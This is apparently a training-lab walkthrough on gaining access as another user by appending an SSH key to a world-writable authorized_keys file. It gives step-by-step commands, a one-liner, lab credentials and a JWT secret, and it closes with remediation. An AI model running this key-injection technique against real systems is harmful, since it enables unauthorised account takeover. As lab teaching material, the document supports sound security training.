# SSH Key Authentication Lab - Walkthrough

> Pre-Lab: Complete this before the web vulnerability labs

---

## Objective

Gain SSH access to user **john** and retrieve his developer notes from `/home/john/hint.txt`.

**Reward:** John's notes contain credentials, payloads, and hints for ALL the web labs!

---

## Scenario

You've discovered an SSH server running on port 2222. You have credentials for a low-privilege user called "noob". Your goal is to escalate access to the user "john" who has disabled password authentication. John is a developer who keeps notes about the web applications - notes that would be very useful for a penetration tester...

---

## Lab Connection

```bash
ssh noob@10.10.61.221 -p 2222
Password: noob
```

Replace `10.10.61.221` with the actual lab server IP address.

---

## Walkthrough

### Step 1: Connect as noob

```bash
ssh noob@10.10.61.221 -p 2222
```

When prompted for password, enter: `noob`

You should see a shell prompt:
```
noob@ssh-lab:~$
```

---

### Step 2: Explore the system

First, let's see what users exist on this system:

```bash
cat /etc/passwd | grep -E "noob|john"
```

Output:
```
noob:x:1000:1000::/home/noob:/bin/bash
john:x:1001:1001::/home/john:/bin/bash
```

There's another user called **john**. Let's try to access john's home:

```bash
ls -la /home/john/
```

Output:
```
ls: cannot open directory '/home/john/': Permission denied
```

We can't list john's home directory. But let's try accessing `.ssh` directly:

```bash
ls -la /home/john/.ssh/
```

Output:
```
drwxrwxrwx 1 john john 4096 ... .
drwx--x--x 1 john john 4096 ... ..
```

---

### Step 3: Identify the vulnerability

The `.ssh` directory has permissions `777` (rwxrwxrwx) - **world-writable!**

This means **anyone** can write files into john's `.ssh` directory.

Let's also check if there's a hint.txt file we can't read yet:

```bash
cat /home/john/hint.txt
```

Output:
```
cat: /home/john/hint.txt: Permission denied
```

We need to become john to read his files.

---

### Step 4: Understand SSH key authentication

SSH key authentication works like this:
1. You have a **private key** (kept secret)
2. You have a **public key** (can be shared)
3. The server stores your public key in `~/.ssh/authorized_keys`
4. When you connect, SSH proves you have the private key

If we can write our public key to john's `authorized_keys`, we can SSH as john!

---

### Step 5: Generate an SSH keypair

On the noob account, generate a new SSH keypair:

```bash
ssh-keygen -t rsa -f ~/.ssh/id_rsa -N ""
```

- `-t rsa` - Use RSA algorithm
- `-f ~/.ssh/id_rsa` - Save to default location
- `-N ""` - No passphrase (empty)

This creates:
- `~/.ssh/id_rsa` - Private key (keep secret!)
- `~/.ssh/id_rsa.pub` - Public key (we'll inject this)

---

### Step 6: Inject public key into john's authorized_keys

Copy your public key to john's authorized_keys file:

```bash
cat ~/.ssh/id_rsa.pub >> /home/john/.ssh/authorized_keys
```

Verify it was written:

```bash
cat /home/john/.ssh/authorized_keys
```

You should see your public key (starts with `ssh-rsa AAAA...`).

---

### Step 7: SSH as john

Now connect as john using your private key:

```bash
ssh john@localhost
```

No password needed! You should get a shell as john:

```
john@ssh-lab:~$
```

Verify you're john:

```bash
whoami
```

Output:
```
john
```

---

### Step 8: Read John's Developer Notes

Now read the hint.txt file:

```bash
cat ~/hint.txt
```

You'll find John's personal development notes containing:

```
================================================================================
                         JOHN'S DEVELOPMENT NOTES
                      Internal Use Only - DO NOT SHARE
================================================================================

- Database credentials (MySQL)
- SQL injection payloads that work on /members/
- JWT secret key and exploitation techniques
- File upload bypass methods
- CSRF attack templates
- SSRF internal endpoints
- XSS payloads
- Quick reference table for all labs
```

**Congratulations!** You now have insider knowledge to help you complete all the web labs.

---

## What You'll Find in John's Notes

The `hint.txt` file contains detailed information for each web lab:

| Lab | Information Revealed |
|-----|---------------------|
| Database | MySQL credentials: `locadmin` / `locpass123` |
| SQL Injection | Working UNION payloads, table names, column counts |
| JWT | Secret key: `sup3r_s3cr3t_jwt_k3y_2024`, algorithm bypass |
| File Upload | JPEG magic bytes, polyglot technique, upload path |
| CSRF | Transfer endpoint, attack template HTML, test accounts |
| SSRF | Internal URL: `http://127.0.0.1:7070/internal/config` |
| XSS | Multiple payloads including cookie stealer |

**This is why SSH lab is the "Pre-Lab"** - completing it gives you a significant advantage!

---

## Why Did This Work?

### The Vulnerability

1. **Weak permissions on .ssh directory**
   - John's `.ssh` directory is `777` (world-writable)
   - Any user can create/modify files in it

2. **StrictModes disabled**
   - Normally, SSH refuses to use `authorized_keys` if permissions are too open
   - The server has `StrictModes no` in sshd_config, bypassing this check

3. **Password auth disabled for john**
   - John can't login with password
   - But SSH key auth still works!

### Real-World Impact

- Any user on the system can impersonate john
- No password required, no brute force needed
- Difficult to detect without monitoring `authorized_keys` changes
- Common misconfiguration in shared hosting environments

---

## Remediation

To fix this vulnerability:

1. **Fix .ssh permissions:**
   ```bash
   chmod 700 /home/john/.ssh
   chmod 600 /home/john/.ssh/authorized_keys
   ```

2. **Enable StrictModes:**
   ```
   # In /etc/ssh/sshd_config
   StrictModes yes
   ```

3. **Monitor authorized_keys:**
   - Use file integrity monitoring (AIDE, OSSEC)
   - Alert on changes to authorized_keys files

---

## Quick Reference

| Item | Value |
|------|-------|
| Port | 2222 |
| User 1 | noob (password: noob) |
| User 2 | john (key auth only) |
| Vulnerability | World-writable .ssh + StrictModes no |
| Reward | Developer notes with hints for all web labs |

---

## One-Liner Solution

For experienced students, here's the quick version:

```bash
# As noob
ssh-keygen -t rsa -f ~/.ssh/id_rsa -N "" && \
cat ~/.ssh/id_rsa.pub >> /home/john/.ssh/authorized_keys && \
ssh john@localhost -o StrictHostKeyChecking=no "cat ~/hint.txt"
```

---

*Created: 2026-03-06*
*Lab: SSH Key Authentication (Pre-Lab)*
